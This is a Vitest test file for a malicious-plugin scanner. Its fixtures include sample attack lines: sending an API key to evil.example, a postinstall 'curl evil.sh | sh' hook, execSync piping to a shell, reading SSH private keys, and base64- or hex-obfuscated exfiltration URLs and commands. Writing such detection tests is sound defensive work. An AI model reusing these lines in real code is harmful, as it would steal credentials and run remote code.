import { describe, expect, it } from 'vitest'
import { scanPlugin } from '../src/index.ts'

describe('scanPlugin (regex + install-script layer)', () => {
  it('flags exfiltration: secret read + network egress', () => {
    const report = scanPlugin({
      'package.json': '{"name":"bad","version":"1.0.0"}',
      'lib/index.js': [
        "const key = process.env.OPENAI_API_KEY",
        "await fetch('https://evil.example/' + key)",
      ].join('\n'),
    })
    expect(report.verdict).toBe('MALICIOUS')
    expect(report.findings.some(f => f.rule === 'exfil-combo')).toBe(true)
    expect(report.findings.some(f => f.rule === 'exfil-secrets')).toBe(true)
  })

  it('flags dynamic eval and private-key access', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'src/x.ts': [
        "eval(atob('dmFyIHg9MQ=='))",
        "readFileSync('/home/user/.ssh/id_rsa')",
      ].join('\n'),
    })
    expect(report.findings.some(f => f.rule === 'dynamic-eval')).toBe(true)
    expect(report.findings.some(f => f.rule === 'exfil-keys')).toBe(true)
  })

  it('flags install-time scripts', () => {
    const report = scanPlugin({
      'package.json': JSON.stringify({ scripts: { postinstall: 'curl evil.sh | sh' } }),
      'lib/index.js': 'console.log("hi")',
    })
    expect(report.findings.some(f => f.rule === 'install-script')).toBe(true)
    expect(report.findings.some(f => f.rule.startsWith('install-script/'))).toBe(true)
  })

  it('returns CLEAN for a benign plugin', () => {
    const report = scanPlugin({
      'package.json': '{"name":"good","version":"1.0.0"}',
      'lib/index.js': 'export function apply() {}',
    })
    expect(report.verdict).toBe('CLEAN')
  })
})

describe('scanPlugin (AST + deobfuscation layer)', () => {
  it('catches obfuscated dynamic require that regex would miss', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': [
        'const name = Buffer.from("6673", "hex").toString()',
        'const fs = require(name)',
      ].join('\n'),
    })
    expect(report.findings.some(f => f.rule === 'ast/unsafe-import')).toBe(true)
  })

  it('catches sensitive path literal via AST data-exfiltration', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': 'const p = "~/.ssh/id_rsa"; readFileSync(p)',
    })
    expect(report.findings.some(f => f.rule === 'ast/data-exfiltration')).toBe(true)
  })

  it('catches shell command inside exec via AST', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': 'require("child_process").execSync("curl evil.sh | sh")',
    })
    expect(report.findings.some(f => f.rule === 'ast/unsafe-command')).toBe(true)
    expect(report.findings.some(f => f.rule === 'child-process')).toBe(true)
  })

  it('deobfuscates base64-hidden exfiltration URL', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': [
        'const u = atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw=")',
        'await fetch(u)',
      ].join('\n'),
    })
    expect(report.findings.some(f => f.rule === 'deobfuscated-url')).toBe(true)
  })

  it('deobfuscates unicode-escaped command', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': 'const c = "\\x63\\x75\\x72\\x6c\\x20\\x65\\x76\\x69\\x6c\\x2e\\x73\\x68"',
    })
    expect(report.findings.some(f => f.rule === 'deobfuscated-command')).toBe(true)
  })

  it('deobfuscates String.fromCharCode hidden secret', () => {
    const report = scanPlugin({
      'package.json': '{}',
      'lib/index.js': 'const s = String.fromCharCode(65,80,73,95,75,69,89)',
    })
    expect(report.findings.some(f => f.rule === 'deobfuscated-secret')).toBe(true)
  })
})
